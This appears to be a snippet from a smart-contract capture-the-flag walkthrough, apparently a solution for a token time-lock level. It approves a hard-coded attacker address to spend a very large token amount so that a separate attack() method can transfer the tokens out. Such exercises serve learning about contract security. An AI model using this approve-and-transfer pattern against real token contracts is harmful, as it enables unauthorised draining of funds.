// step one: deploy attacker on the network
// step two: approve the attacker to transfer tokens on our behalf
var attacker = "0x19700481d87a43E0E60B94a5Fd2EcA77e0E4814B";
var amount = "1000000000000000000000000";
await contract.approve(attacker, amount);
// step three: go back to attacker and transfer the tokens using the attack() method














